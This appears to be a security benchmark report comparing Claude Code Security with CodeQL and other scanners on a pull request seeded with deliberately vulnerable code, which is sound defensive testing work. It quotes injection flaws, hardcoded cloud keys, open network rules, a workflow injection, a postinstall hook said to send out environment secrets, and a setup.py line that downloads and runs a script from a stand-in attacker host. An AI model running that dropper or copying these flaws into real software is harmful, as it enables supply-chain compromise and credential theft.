# PoC Security Benchmark Report

## Scope
This PoC was executed on PR #4:
- https://github.com/dorsha2/vulnerable-multilang-security-lab/pull/4

Goal:
- Compare **Claude Code Security scan** vs **CodeQL SAST** on the same pull request.
- Add intentionally vulnerable content in:
  - Application code
  - IaC (Terraform / AWS)
  - GitHub workflow
  - Malicious dependency samples (malware-like behavior)
- Run scanners and observe what fails and what passes.

## Checks Compared
- `claude-review` (Claude Code Security)
- `CodeQL` (GitHub Advanced Security code scanning check)
- `codeql-sast (javascript-typescript)`
- `codeql-sast (python)`
- `codeql-sast (java-kotlin)`
- `iac-checkov`
- `workflow-zizmor`
- `malware-guarddog`

## Vulnerable Code Examples Used In PoC

### 1) Application Vulnerabilities
File: `javascript/benchmark_vuln.js`

```js
exec(userCmd, (err, stdout, stderr) => { ... }); // command injection
const sql = "SELECT * FROM users WHERE username = '" + u + "' AND password = '" + p + "'"; // SQL injection
```

File: `javascript/codeql_trigger_eval.js`

```js
const code = req.query.code;
const result = eval(code); // code injection
```

### 2) IaC Misconfigurations (Terraform / AWS)
File: `iac/aws/main.tf`

```hcl
access_key = "AKIAEXAMPLEINSECUREKEY"
secret_key = "insecure-hardcoded-aws-secret"
```

```hcl
block_public_acls       = false
block_public_policy     = false
ignore_public_acls      = false
restrict_public_buckets = false
```

```hcl
cidr_blocks = ["0.0.0.0/0"] # SSH 22 and RDP 3389 exposed
```

```hcl
Action   = "*"
Resource = "*"
```

### 3) Vulnerable GitHub Workflow (Command/Template Injection)
File: `.github/workflows/vulnerable-manual-deploy.yml`

```yaml
bash -lc "${{ github.event.inputs.user_command }}"
```

### 4) Malware / Malicious Dependency Behavior
File: `malicious/npm-env-stealer/postinstall.js`

```js
scripts: { "postinstall": "node postinstall.js" }
// postinstall exfiltrates process.env (including token-like data) to external host
```

File: `malicious/pypi-dropper/setup.py`

```python
os.system("curl -s https://attacker.invalid/payload.sh | bash")
```

## Observed Results

### Claude Code Security
- Status: **FAILED**
- Reported multiple HIGH findings (app injection, workflow injection, IaC misconfig, malicious dependency behavior).

### CodeQL
- `CodeQL` (GHAS check): **FAILED**
  - Reported: **1 critical** security alert.
  - Example alert: `js/code-injection` in `javascript/codeql_trigger_eval.js:8`.
- `codeql-sast` matrix jobs:
  - javascript-typescript: **PASSED**
  - python: **PASSED**
  - java-kotlin: **PASSED**

### IaC/Workflow/Malware Specific Scanners
- `iac-checkov`: **FAILED**
- `workflow-zizmor`: **FAILED**
- `malware-guarddog`: **FAILED**

## Final Summary Table (V = Passed, X = Failed)

| Check | Focus | Result | Passed Scan? |
|---|---|---|---|
| `claude-review` | Multi-domain AI security review | Failed | X |
| `CodeQL` | GitHub code scanning (semantic SAST) | Failed | X |
| `codeql-sast (javascript-typescript)` | JS CodeQL workflow job | Passed | V |
| `codeql-sast (python)` | Python CodeQL workflow job | Passed | V |
| `codeql-sast (java-kotlin)` | Java/Kotlin CodeQL workflow job | Passed | V |
| `iac-checkov` | Terraform/IaC misconfiguration scan | Failed | X |
| `workflow-zizmor` | GitHub workflow security scan | Failed | X |
| `malware-guarddog` | Malicious package behavior scan | Failed | X |

## PoC Takeaway
- In this PoC, **Claude Code Security** detected broader risky patterns across app + IaC + workflow + supply chain.
- **CodeQL** produced a strong critical semantic alert for explicit code injection.
- For end-to-end coverage in CI, the best value came from combining:
  - Claude (broad contextual review)
  - CodeQL (semantic code SAST)
  - Checkov / zizmor / GuardDog (domain-specific depth)
